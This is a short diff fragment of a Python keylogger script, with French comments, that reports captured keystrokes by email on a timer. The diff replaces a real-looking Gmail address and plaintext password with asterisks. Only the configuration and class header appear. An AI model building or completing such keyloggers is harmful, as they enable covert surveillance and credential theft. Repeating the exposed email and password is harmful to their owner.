@@ -6,8 +6,8 @@ from threading import Timer
 from datetime import datetime
 SEND_REPORT_EVERY = 5 # pour l'envoie des infos collecter que 60s (on peut le changer)
 # enter votre adresse mail et le mdps 
-EMAIL_ADDRESS = "rymasmara40@gmail.com"
-EMAIL_PASSWORD = "Weirdstuff20"
+EMAIL_ADDRESS = "******@gmail.com"
+EMAIL_PASSWORD = "*******"
 class Keylogger:
     def __init__(self, interval, report_method="email"):
         # on effectue SEND_REPORT_EVERY a interval
